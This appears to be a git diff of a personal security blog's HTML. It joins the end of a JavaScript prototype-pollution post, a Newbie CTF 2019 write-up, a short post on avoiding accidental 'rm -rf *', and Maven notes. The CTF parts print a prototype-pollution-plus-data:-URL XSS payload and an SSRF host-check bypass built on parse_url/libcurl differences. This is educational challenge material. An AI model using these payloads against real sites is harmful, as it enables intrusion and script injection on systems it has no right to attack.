+    <article id="post-js原型链污染" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/1970/01/01/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" class="article-date">
+  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/web/">web</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/1970/01/01/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">js原型链污染</a>
     </h1>
   
 
@@ -1015,12 +878,12 @@ const infobox = (text) =&gt; {
 <p>但是我们可以利用data协议来绕过正则从而直接执行命令</p>
 <p>data协议格式</p>
 <pre><code>data:[&lt;mime type&gt;][;charset=&lt;charset&gt;][;base64],&lt;encoded data&gt;</code></pre><p>最后的payload:<code>http://127.0.0.1/?repair={&quot;key&quot;:&quot;🔑&quot;,&quot;__proto__&quot;:{&quot;__proto__&quot;:[&quot;lol&quot;]}}&amp;help=data://car-repair-shop.fluxfingersforfuture.fluxfingers.net/asdfsdf/asdf,alert(&quot;123&quot;)%23.js#BugattiPorsche</code></p>
-<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/02/18/js原型链污染/">http://blog.ccreater.top/2020/02/18/js原型链污染/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
+<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/1970/01/01/js原型链污染/">https://www.ccreater.top/1970/01/01/js原型链污染/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://blog.ccreater.top/2020/02/18/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" data-id="ckmn4mn360053g4ni4zgk6lg8" data-title="js原型链污染" class="article-share-link">Share</a>
+      <a data-url="https://www.ccreater.top/1970/01/01/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" data-id="ckmn575770063s1nie31t6qlo" data-title="js原型链污染" class="article-share-link">Share</a>
       
 	  
       
@@ -1037,12 +900,16 @@ const infobox = (text) =&gt; {
 
 
   
-    <article id="post-避免rm-rf-的悲惨命运" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-nbctf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2020/02/17/%E9%81%BF%E5%85%8Drm-rf-%E7%9A%84%E6%82%B2%E6%83%A8%E5%91%BD%E8%BF%90/" class="article-date">
-  <time class="dt-published" datetime="2020-02-17T13:44:07.000Z" itemprop="datePublished">2020-02-17</time>
+    <a href="/1970/01/01/nbctf/" class="article-date">
+  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
 </a>
     
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
+  </div>
+
   </div>
   <div class="article-inner">
     
@@ -1051,7 +918,7 @@ const infobox = (text) =&gt; {
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/02/17/%E9%81%BF%E5%85%8Drm-rf-%E7%9A%84%E6%82%B2%E6%83%A8%E5%91%BD%E8%BF%90/">避免rm -rf *的悲惨命运</a>
+      <a class="p-name article-title" href="/1970/01/01/nbctf/">newbie ctf 2019</a>
     </h1>
   
 
@@ -1059,897 +926,545 @@ const infobox = (text) =&gt; {
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h1 id="避免rm-rf-的悲惨命运"><a href="#避免rm-rf-的悲惨命运" class="headerlink" title="避免rm -rf *的悲惨命运"></a>避免rm -rf *的悲惨命运</h1><p>今天又是悲惨的一天,没认真看,rm -rf *错地方了</p>
-<p>为了再次避免悲惨命运</p>
-<ol>
-<li><p>还是不要老是用root用户了,创个日常的低权限用户,有必要时再登陆root</p>
-</li>
-<li><p>别用rm 啦,改用trash吧</p>
-</li>
-</ol>
-<h2 id="安装trash-cli"><a href="#安装trash-cli" class="headerlink" title="安装trash-cli"></a>安装trash-cli</h2><p><code>apt-get install trash-cli</code></p>
-<p><code>echo alias rm=trash &gt;&gt; ~/.zshrc</code></p>
-<p><code>source ~/.zshrc</code> </p>
-<h2 id="trash-cli-命令"><a href="#trash-cli-命令" class="headerlink" title="trash-cli 命令"></a>trash-cli 命令</h2><table>
+        <h1 id="newbie-ctf-2019"><a href="#newbie-ctf-2019" class="headerlink" title="newbie ctf 2019"></a>newbie ctf 2019</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="normal-host"><a href="#normal-host" class="headerlink" title="normal_host"></a>normal_host</h3><p>题目描述:</p>
+<blockquote>
+<p>You can get flag in “normalflag.iwinv.net”</p>
+</blockquote>
+<p>题目给的链接</p>
+<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kogjizorj30ue0gvngf.jpg" alt="image.png"></p>
+<p>直接访问 flag</p>
+<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kofgp0d7j312909paar.jpg" alt="image.png"></p>
+<p>输入网站测试发现,会在网址后面加个secret参数</p>
+<p><img src="C:%5CUsers%5C%E8%94%A1%E5%BB%BA%E6%96%8C%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191103111420354.png" alt="image-20191103111420354"></p>
+<p>而flag界面就是通过这个secret来识别是否通过internal.iwinv.net</p>
+<p>观察secret发现，每次访问给出的secret都不一样</p>
+<p>排除掉算出secret的做法,那么接下来就是要绕过禁用host的限制或者是输入一个网址，让其无法识别出是<code>normalflag.iwinv.net</code>却能访问<code>normalflag.iwinv.net</code></p>
+<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kolppcsfj30g3045748.jpg" alt="image.png"></p>
+<p>这就很容易想到php里面libcurl和parase的差异</p>
+<blockquote>
+<p>parse_url与libcurl对与url的解析差异可能导致ssrf当url中有多个@符号时，parse_url中获取的host是最后一个@符号后面的host，而libcurl则是获取的第一个@符号之后的。因此当代码对<a href="http://user@eval.com:80@baidu.com进行解析时，PHP获取的host是baidu.com是允许访问的域名，而最后调用libcurl进行请求时则是请求的eval.com域名，可以造成ssrf绕过此外对于https://evil@baidu.com这样的域名进行解析时,php获取的host是evil@baidu.com，但是libcurl获取的host却是evil.com" target="_blank" rel="noopener">http://user@eval.com:80@baidu.com进行解析时，PHP获取的host是baidu.com是允许访问的域名，而最后调用libcurl进行请求时则是请求的eval.com域名，可以造成ssrf绕过此外对于https://evil@baidu.com这样的域名进行解析时,php获取的host是evil@baidu.com，但是libcurl获取的host却是evil.com</a> </p>
+<p>from  <a href="https://paper.seebug.org/561" target="_blank" rel="noopener">https://paper.seebug.org/561</a> </p>
+</blockquote>
+<p>构造url:<code>user@4399.com@normalflag.iwinv.net</code>(我是来帮4399打广告的:v:)​</p>
+<p>KorNewbie{H0$7_$P1it_A774cK_U$3s_N0RM^liZ47ioN&amp;##$%%!}</p>
+<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="catch-me"><a href="#catch-me" class="headerlink" title="catch me"></a>catch me</h3><p>利用工具逐帧查看，把每个子出现的位置记录转成ascii码得到flag</p>
+<p>KorNewbie{w0w_e4g1e_3y3}</p>
+<h3 id="BiMilCode"><a href="#BiMilCode" class="headerlink" title="BiMilCode"></a>BiMilCode</h3><p><img src="http://ww1.sinaimg.cn/large/006pWR9aly1g8kovw3cl4j30e704pt8u.jpg" alt="image.png"></p>
+<p>刚开始题目说要encode。结果被这个误解搞了一个小时才发现是decode</p>
+<p>观察发现一个字符会被编码成2位的16进制的数据</p>
+<p>认真观察发现编码方式还和位置有关，但是相同的位置编码方式相同,而且只是对ascii码进行移位</p>
+<p>也就是说,在同一个会话里,我们可以通过ascii码的差值来得到来计算出题目给出的编码后的字符串</p>
+<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kp8m10vej30ep058jrl.jpg" alt="image.png"></p>
+<pre><code class="python">s2=&#39;45 dd 97 38 62 6c 62 85&#39;.split(&#39; &#39;)
+s1=&#39;3a 93 78 3a 6c 63 3a 63&#39;.split(&#39; &#39;)
+print(s1)
+print(s2)
+for i in range(len(s1)):
+    print(chr(ord(&#39;0&#39;)+int(s1[i],16)-int(s2[i],16)),end=&#39;&#39;)</code></pre>
+<p>KorNewbie{Nace_I_believed_it}</p>
+<h2 id="Forensic"><a href="#Forensic" class="headerlink" title="Forensic"></a>Forensic</h2><h3 id="find-the-plain"><a href="#find-the-plain" class="headerlink" title="find the plain"></a>find the plain</h3><p>题目描述</p>
+<blockquote>
+<p>Alpha team’s whistleblower captured a packet that leaked internal information to the outside using ftp internal confidential data.</p>
+<p>Analyze the packet and flag the password and information obtained for the ftp connection!</p>
+<p>flag format : KorNewbie{password_yougetinformation}</p>
+<p>※ If there is a hash value, it will be md5.</p>
+</blockquote>
+<p>用<code>(!frame.len== 1518) &amp;&amp;(!frame.len== 1514)&amp;&amp; (! ip.addr==192.229.232.240) &amp;&amp; (not tcp.stream==2) &amp;&amp; (not tcp.stream==0)&amp;&amp; (not tcp.stream==1)</code></p>
+<p>过滤找到ftp传输文件和账号密码</p>
+<p>password:root</p>
+<p>badguy.txt</p>
+<pre><code>7J2067O06rKMIOyVjO2MjO2MgOydmCDsi6Dsg4HsoJXrs7TripQg67CR7J2YIOyjvOyGjOyXkCDrqqjrkZAg64u07JWE64aT7JWY64SkLiDqsbTtiKzrpbwg67mM7KeA7JuM7YSwLi4gDQpodHRwczovL3Bhc3RlYmluLmNvbS83MHlER2lSUw==</code></pre><p>decode得到</p>
+<pre><code>이보게 알파팀의 신상정보는 밑의 주소에 모두 담아놓았네. 건투를 빌지워터.. 
+//alpha组的个人信息全部放在下面的地址里。祝你成功..
+https://pastebin.com/70yDGiRS</code></pre><p><code>k459iki6m5j094m2lmkhjmi9527l81ml</code></p>
+<p>题目提示得到的一个信息是md5</p>
+<p>所以对这个进行凯撒密码解密得到<code>d459bdb6f5c094f2efdacfb9527e81fe</code></p>
+<p>后面发现<img src="http://ww1.sinaimg.cn/large/006pWR9aly1g8k0vd6qapj30ue015gli.jpg" alt="image.png"></p>
+<p>这里也提示了凯撒加密</p>
+<p>但是用国内的md5解密网站无论如何也破不了</p>
+<p>用朝鲜语搜了一下就解密了</p>
+<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8k0ww99j0j30j6036t8w.jpg" alt="image.png"></p>
+<p>KorNewbie{root_IronDragon}</p>
+<p>………………………</p>
+<p>这是个梗吗.</p>
+<h3 id="chat"><a href="#chat" class="headerlink" title="chat"></a>chat</h3><p>题目描述</p>
+<blockquote>
+<p>Confidential information came and went through chat. Find the email of the user who used the chat. </p>
+</blockquote>
+<p>user:NewbieCTF2019</p>
+<p>在youtube找到一个好玩的重置密码的方法</p>
+<p> <a href="https://www.youtube.com/watch?v=YBFAzK9mgNI" target="_blank" rel="noopener">https://www.youtube.com/watch?v=YBFAzK9mgNI</a> </p>
+<p>根据这个来重置密码</p>
+<p>重置密码后看着棒子文我是懵逼的(同伴+1)</p>
+<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kph085tzj31gw0see6k.jpg" alt="image.png"></p>
+<p>根据题目提示聊天软件理所当然的盯上了kakao</p>
+<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kppnap1sj30wj0b60u7.jpg" alt="image.png"></p>
+<p>跑到文件夹里翻一翻(也可以写个脚本/fad)</p>
+<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kpqxb2njj30tz0j8my5.jpg" alt="image.png"></p>
+<p>最后拿到flag</p>
+<p><code>KorNewbie{renek@it-simple.net}</code></p>
+<h3 id="rec"><a href="#rec" class="headerlink" title="rec"></a>rec</h3><p>这题跟进去调试也没看到啥，想来想去防止取证题的地方怎么也不可能是逆向啥的、</p>
+<p>于是就开始用binwalk,strings…..</p>
+<p>最后翻一翻找到了seg段…………</p>
+<p>在seg段找到</p>
+<p><img src="http://ww1.sinaimg.cn/large/006pWR9aly1g8k2xe25wlj30io0gbdio.jpg" alt="image.png"></p>
+<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/1970/01/01/nbctf/">https://www.ccreater.top/1970/01/01/nbctf/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://www.ccreater.top/1970/01/01/nbctf/" data-id="ckmn575780066s1ni5t49hvps" data-title="newbie ctf 2019" class="article-share-link">Share</a>
+      
+	  
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+
+  
+    <article id="post-maven学习笔记" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/1970/01/01/maven%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="article-date">
+  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/1970/01/01/maven%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">maven学习笔记</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="maven学习笔记"><a href="#maven学习笔记" class="headerlink" title="maven学习笔记"></a>maven学习笔记</h1><h2 id="学习网站"><a href="#学习网站" class="headerlink" title="学习网站"></a>学习网站</h2><p> <a href="https://www.imooc.com/learn/443" target="_blank" rel="noopener">https://www.imooc.com/learn/443</a> (这个挺好的)</p>
+<p> <a href="https://www.runoob.com/maven/maven-tutorial.html" target="_blank" rel="noopener">https://www.runoob.com/maven/maven-tutorial.html</a> </p>
+<h2 id="maven功能"><a href="#maven功能" class="headerlink" title="maven功能"></a>maven功能</h2><ul>
+<li>构建</li>
+<li>文档生成</li>
+<li>报告</li>
+<li>依赖</li>
+<li>SCMs</li>
+<li>发布</li>
+<li>分发</li>
+<li>邮件列表</li>
+</ul>
+<h2 id="约定配置"><a href="#约定配置" class="headerlink" title="约定配置"></a>约定配置</h2><p>Maven 提倡使用一个共同的标准目录结构，Maven 使用约定优于配置的原则，大家尽可能的遵守这样的目录结构。如下所示：</p>
+<table>
 <thead>
 <tr>
-<th>command</th>
-<th>explain</th>
+<th align="left">目录</th>
+<th align="left">目的</th>
 </tr>
 </thead>
 <tbody><tr>
-<td>trash-put/trash</td>
-<td>将文件或目录放进回收站</td>
+<td align="left">${basedir}</td>
+<td align="left">存放pom.xml和所有的子目录</td>
 </tr>
 <tr>
-<td>trash-empty</td>
-<td>清空回收站</td>
+<td align="left">${basedir}/src/main/java</td>
+<td align="left">项目的java源代码</td>
 </tr>
 <tr>
-<td>trash-list</td>
-<td>列出回收站中的文件</td>
+<td align="left">${basedir}/src/main/resources</td>
+<td align="left">项目的资源，比如说property文件，springmvc.xml</td>
 </tr>
 <tr>
-<td>restore-trash</td>
-<td>还原回收站中的文件</td>
+<td align="left">${basedir}/src/test/java</td>
+<td align="left">项目的测试类，比如说Junit代码</td>
 </tr>
 <tr>
-<td>trash-rm</td>
-<td>删除回收站中的单个文件</td>
+<td align="left">${basedir}/src/test/resources</td>
+<td align="left">测试用的资源</td>
+</tr>
+<tr>
+<td align="left">${basedir}/src/main/webapp/WEB-INF</td>
+<td align="left">web应用文件目录，web项目的信息，比如存放web.xml、本地图片、jsp视图页面</td>
+</tr>
+<tr>
+<td align="left">${basedir}/target</td>
+<td align="left">打包输出目录</td>
+</tr>
+<tr>
+<td align="left">${basedir}/target/classes</td>
+<td align="left">编译输出目录</td>
+</tr>
+<tr>
+<td align="left">${basedir}/target/test-classes</td>
+<td align="left">测试编译输出目录</td>
+</tr>
+<tr>
+<td align="left">Test.java</td>
+<td align="left">Maven只会自动运行符合该命名规则的测试类</td>
+</tr>
+<tr>
+<td align="left">~/.m2/repository</td>
+<td align="left">Maven默认的本地仓库目录位置</td>
 </tr>
 </tbody></table>
-<h2 id="垃圾站所在位置"><a href="#垃圾站所在位置" class="headerlink" title="垃圾站所在位置"></a>垃圾站所在位置</h2><p><code>~/.local/share/Trash/files</code></p>
-<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/02/17/避免rm-rf-的悲惨命运/">http://blog.ccreater.top/2020/02/17/避免rm-rf-的悲惨命运/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
+<h2 id="Maven-POM"><a href="#Maven-POM" class="headerlink" title="Maven POM"></a>Maven POM</h2><p> POM( Project Object Model，项目对象模型 ) 是 Maven 工程的基本工作单元，是一个XML文件 ,用于描述如何构建项目</p>
+<p>在创建 POM 之前，我们首先需要描述项目组 (groupId), 项目的唯一ID。 </p>
+<h3 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h3><pre><code class="xml">&lt;project xmlns = &quot;http://maven.apache.org/POM/4.0.0&quot;
+    xmlns:xsi = &quot;http://www.w3.org/2001/XMLSchema-instance&quot;
+    xsi:schemaLocation = &quot;http://maven.apache.org/POM/4.0.0
+    http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;
+
+    &lt;!-- 模型版本 --&gt;
+    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;
+    &lt;!-- 公司或者组织的唯一标志，并且配置时生成的路径也是由此生成， 如com.companyname.project-group，maven会将该项目打成的jar包放本地路径：/com/companyname/project-group --&gt;
+    &lt;groupId&gt;com.companyname.project-group(公司网站反写+项目名)&lt;/groupId&gt;
+
+    &lt;!-- 项目的唯一ID，一个groupId下面可能多个项目，就是靠artifactId来区分的 --&gt;
+    &lt;artifactId&gt;project+模块名&lt;/artifactId&gt;
+
+    &lt;!-- 版本号 --&gt;
+    &lt;version&gt;1.0&lt;/version&gt;
+&lt;/project&gt;</code></pre>
+<h3 id="常见标签解释"><a href="#常见标签解释" class="headerlink" title="常见标签解释"></a>常见标签解释</h3><pre><code class="xml">&lt;project xmlns = &quot;http://maven.apache.org/POM/4.0.0&quot;
+    xmlns:xsi = &quot;http://www.w3.org/2001/XMLSchema-instance&quot;
+    xsi:schemaLocation = &quot;http://maven.apache.org/POM/4.0.0
+    http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;
+
+    &lt;!-- 模型版本 --&gt;
+    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;
+    &lt;!-- 公司或者组织的唯一标志，并且配置时生成的路径也是由此生成， 如com.companyname.project-group，maven会将该项目打成的jar包放本地路径：/com/companyname/project-group --&gt;
+    &lt;groupId&gt;com.companyname.project-group(公司网站反写+项目名)&lt;/groupId&gt;
+
+    &lt;!-- 项目的唯一ID，一个groupId下面可能多个项目，就是靠artifactId来区分的 --&gt;
+    &lt;artifactId&gt;project+模块名&lt;/artifactId&gt;
+
+    &lt;!-- 版本号
+     第一个数字表示大版本号
+    第二个数字表示分支版本号
+    第三个数字表示小版本号
+    snapshot 快照
+    alpha 内部测试
+    beta 公测
+    Release 稳定版本
+    GA 正式发布
+    --&gt;
+    &lt;version&gt;1.0.0-xxx&lt;/version&gt;
+    &lt;!-- 打包方式，默认是jar,还有:war zip pom--&gt;
+    &lt;packaging&gt;&lt;/packaging&gt;
+    &lt;!--项目描述名--&gt;
+    &lt;name&gt;&lt;/name&gt;
+    &lt;!--项目地址 --&gt;
+    &lt;url&gt;&lt;/url&gt;
+    &lt;!--项目描述 --&gt;
+    &lt;descriptions&gt;&lt;/descriptions&gt;
+    &lt;!--开发人员信息 --&gt;
+    &lt;developers&gt;&lt;/developers&gt;
+    &lt;dependeies&gt;
+        &lt;dependency&gt;
+            &lt;groupId&gt;com.companyname.project-group(公司网站反写+项目名)&lt;/groupId&gt;
+
+            &lt;artifactId&gt;project+模块名&lt;/artifactId&gt;
+            &lt;version&gt;1.0.0-xxx&lt;/version&gt;
+            &lt;type&gt;&lt;/type&gt;
+            &lt;!-- 在test中有用 --&gt;
+            &lt;scope&gt;test&lt;/scope&gt;
+            &lt;!--设置依赖是否可选，默认False，设为False则子项目默认继承，否则得显示声明--&gt;
+            &lt;optional&gt;&lt;/optional&gt;
+            &lt;!-- 排除依赖传递列表
+                如A依赖B，B依赖C，而A不依赖C，此时就可以在此处添加C，来排除依赖
+             --&gt;
+
+            &lt;exclusions&gt;
+                &lt;exclusion&gt;
+                &lt;/exclusion&gt;
+            &lt;/exclusions&gt;
+        &lt;/dependency&gt;
+    &lt;/dependeies&gt;
+    &lt;!-- 依赖的管理，子pom自动继承，但是本身并不依赖 --&gt;
+    &lt;dependencyManagement&gt;
+       &lt;dependeies&gt;
+            &lt;dependency&gt;
+           &lt;/dependency&gt;
+        &lt;/dependeies&gt; 
+    &lt;/dependencyManagement&gt;
+    &lt;build&gt;
+        &lt;plugins&gt;
+            &lt;!-- 详情见在某个阶段使用插件 --&gt;
+        &lt;/plugins&gt;
+    &lt;/build&gt;
+    &lt;!-- 聚合运行多个maven项目,一口气全部编译 --&gt;
+    &lt;modules&gt;
+        &lt;module&gt;
+        &lt;/module&gt;
+    &lt;/modules&gt;
+&lt;/project&gt;</code></pre>
+<h3 id="执行main函数"><a href="#执行main函数" class="headerlink" title="执行main函数"></a>执行main函数</h3><p>在pom下的project添加：</p>
+<pre><code class="xml">&lt;build&gt;
+ &lt;plugins&gt;
+  &lt;plugin&gt;
+   &lt;groupId&gt;org.codehaus.mojo&lt;/groupId&gt;
+   &lt;artifactId&gt;exec-maven-plugin&lt;/artifactId&gt;
+   &lt;version&gt;1.1.1&lt;/version&gt;
+   &lt;executions&gt;
+    &lt;execution&gt;
+     &lt;phase&gt;test&lt;/phase&gt;
+     &lt;goals&gt;
+      &lt;goal&gt;java&lt;/goal&gt;
+     &lt;/goals&gt;
+     &lt;configuration&gt;
+      &lt;mainClass&gt;com.vineetmanohar.module.CodeGenerator&lt;/mainClass&gt;
+      &lt;arguments&gt;
+       &lt;argument&gt;arg0&lt;/argument&gt;
+       &lt;argument&gt;arg1&lt;/argument&gt;
+      &lt;/arguments&gt;
+     &lt;/configuration&gt;
+    &lt;/execution&gt;
+   &lt;/executions&gt;
+  &lt;/plugin&gt;
+ &lt;/plugins&gt;
+&lt;/build&gt;</code></pre>
+<h3 id="依赖范围"><a href="#依赖范围" class="headerlink" title="依赖范围"></a>依赖范围</h3><ul>
+<li>compile<br>默认的范围，编译测试运行都有效</li>
+<li>provided<br>在测试和编译时有效</li>
+<li>runtime<br>在测试和运行时有效</li>
+<li>test<br>只有在测试中有效</li>
+</ul>
+<h3 id="排除依赖"><a href="#排除依赖" class="headerlink" title="排除依赖"></a>排除依赖</h3><p>在pom中的project下添加</p>
+<pre><code class="xml">&lt;!-- 排除依赖传递列表
+                如A依赖B，B依赖C，而A不依赖C，此时就可以在此处添加C，来排除依赖
+             --&gt;
+
+            &lt;exclusions&gt;
+                &lt;exclusion&gt;
+                &lt;/exclusion&gt;
+            &lt;/exclusions&gt;</code></pre>
+<h3 id="依赖冲突解决原则"><a href="#依赖冲突解决原则" class="headerlink" title="依赖冲突解决原则"></a>依赖冲突解决原则</h3><h4 id="短路优先"><a href="#短路优先" class="headerlink" title="短路优先"></a>短路优先</h4><pre><code>A -&gt; B -&gt; C -&gt; X1
+A -&gt; D -&gt; X2
+#A -&gt; D代表 A依赖于D
+此时A依赖于X2</code></pre><h4 id="先声明先优先"><a href="#先声明先优先" class="headerlink" title="先声明先优先"></a>先声明先优先</h4><p>如果路径长度相同(依赖链)，则谁先声明，先解析谁</p>
+<h3 id="聚合"><a href="#聚合" class="headerlink" title="聚合"></a>聚合</h3><p>在容器pom中修改packaging为pom，添加modules</p>
+<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>现有maven项目:maven01和maven02</p>
+<p>新建maven项目：maven03,三个项目均在同一个文件夹下</p>
+<p>在maven03中修改packaging为pom，添加如下modules</p>
+<pre><code class="xml">&lt;modules&gt;
+    &lt;module&gt;
+        ../maven01
+    &lt;/module&gt;
+    &lt;module&gt;
+        ../maven02
+    &lt;/module&gt;
+&lt;/modules&gt;</code></pre>
+<h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><p>当多个maven模块都依赖一个相同的库时，多次声明显得太麻烦此时可以用继承来解决</p>
+<h4 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h4><p>现有两个maven项目(maven01,maven02)都使用junit:3.8.1</p>
+<p>新建父maven项目:maven03，其对应的pom文件为：</p>
+<pre><code class="xml">&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
+  xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;
+  &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;
+
+  &lt;groupId&gt;top.ccreater&lt;/groupId&gt;
+  &lt;artifactId&gt;maven03&lt;/artifactId&gt;
+  &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;
+  &lt;packaging&gt;pom&lt;/packaging&gt;
+
+  &lt;name&gt;maven03&lt;/name&gt;
+  &lt;url&gt;http://maven.apache.org&lt;/url&gt;
+
+  &lt;properties&gt;
+    &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;
+  &lt;/properties&gt;
+
+
+    &lt;dependencyManagement&gt;
+      &lt;dependencies&gt;
+        &lt;dependency&gt;
+          &lt;groupId&gt;junit&lt;/groupId&gt;
+          &lt;artifactId&gt;junit&lt;/artifactId&gt;
+          &lt;version&gt;3.8.1&lt;/version&gt;
+          &lt;scope&gt;test&lt;/scope&gt;
+        &lt;/dependency&gt;
+          &lt;/dependencies&gt;
+    &lt;/dependencyManagement&gt;
+&lt;/project&gt;
+</code></pre>
+<p>将相同的依赖都添加到dependencyManagement下，并修改packaging为pom</p>
+<p>maven01和maven02的pom文件均为：</p>
+<pre><code class="xml">&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
+  xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;
+  &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;
+
+  &lt;groupId&gt;top.ccreater&lt;/groupId&gt;
+  &lt;artifactId&gt;maven02&lt;/artifactId&gt;
+  &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;
+  &lt;packaging&gt;jar&lt;/packaging&gt;
+
+  &lt;name&gt;maven02&lt;/name&gt;
+  &lt;url&gt;http://maven.apache.org&lt;/url&gt;
+
+  &lt;properties&gt;
+    &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;
+  &lt;/properties&gt;
+    &lt;parent&gt;
+      &lt;groupId&gt;top.ccreater&lt;/groupId&gt;
+      &lt;artifactId&gt;maven03(/maven02)&lt;/artifactId&gt;
+      &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;
+    &lt;/parent&gt;
+  &lt;dependencies&gt;
+    &lt;dependency&gt;
+      &lt;groupId&gt;junit&lt;/groupId&gt;
+      &lt;artifactId&gt;junit&lt;/artifactId&gt;
+    &lt;/dependency&gt;
+  &lt;/dependencies&gt;
+&lt;/project&gt;
+</code></pre>
+<h3 id="Super-POM"><a href="#Super-POM" class="headerlink" title="Super POM"></a>Super POM</h3><p>所有的 POM 都继承自一个父 POM（无论是否显式定义了这个父 POM）。父 POM 也被称作 <strong>Super POM</strong>，它包含了一些可以被继承的默认设置。</p>
+<p>Maven 使用 effective pom（Super pom 加上工程自己的配置）来执行相关的目标，它帮助开发者在 pom.xml 中做尽可能少的配置，当然这些配置可以被方便的重写。</p>
+<p>查看 Super POM 默认配置的一个简单方法是执行以下命令：<strong>mvn help:effective-pom</strong> （需要在当前目录下新建一个pom.xml）</p>
+<h3 id="POM-标签详解"><a href="#POM-标签详解" class="headerlink" title="POM 标签详解"></a>POM 标签详解</h3><p><a href="https://www.runoob.com/maven/maven-pom.html" target="_blank" rel="noopener">https://www.runoob.com/maven/maven-pom.html</a></p>
+<h2 id="Maven-构建生命周期"><a href="#Maven-构建生命周期" class="headerlink" title="Maven 构建生命周期"></a>Maven 构建生命周期</h2><p> Maven 构建生命周期定义了一个项目构建跟发布的过程。 </p>
+<p>Maven 有以下三个标准的生命周期：</p>
+<ul>
+<li><strong>clean</strong>：项目清理的处理</li>
+<li><strong>default(或 build)</strong>：项目部署的处理</li>
